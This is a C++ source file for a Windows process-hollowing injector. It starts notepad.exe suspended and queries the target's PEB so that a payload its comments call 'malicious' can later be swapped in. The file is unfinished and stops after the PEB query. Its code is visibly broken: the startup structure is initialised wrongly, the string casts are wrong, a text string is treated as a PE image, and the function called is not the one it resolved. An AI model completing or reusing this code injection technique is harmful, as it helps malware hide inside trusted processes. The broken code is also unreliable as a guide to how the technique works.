#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
using namespace std;


int main() {
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	si.dwXSize = sizeof(si);
	// The application we are targeting
	const char* targetProcessPath = "C:\\Windows\\System32\\notepad.exe";

	const char* payloadBuffer = "Running under malicious";
	
	// Pointing to the malicious program header and its meta data
	//PE header contains information for the operating system how to load and run the program
	// The metafile of a valid exe program, most important field in heere is e_lfanew
	PIMAGE_DOS_HEADER Dos_Header = (PIMAGE_DOS_HEADER)payloadBuffer;
	
	// Ntheaders or PE header contains valuable information 
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuffer + Dos_Header->e_lfanew);
	// Where it wants to be loaded in memory address
	LPVOID Image_base = (LPVOID)ntHeaders->OptionalHeader.ImageBase;
	// The amount of memory space it needs
	SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;

		// Creating the process in suspended state

	if(!CreateProcess((LPCWSTR)targetProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		cerr << "Could not start notepad in suspended state";
		return 1;
	}

	  
	// Finding the target PEB before unmaping it

	typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
		HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
		);
 

	pNtQueryInformationProcess NtQueryInformationProces = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

	if (!NtQueryInformationProces) {
		cerr << "[-] Failed to resolve NTQueryINfomation";
		return 1;
	};
	
	PROCESS_BASIC_INFORMATION pbi;
	NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(ProcessBasicInformation), NULL);
	
	if (status !=0) {
		cerr << "[-] Could not get target process PEB";
		return 1;
	}

}
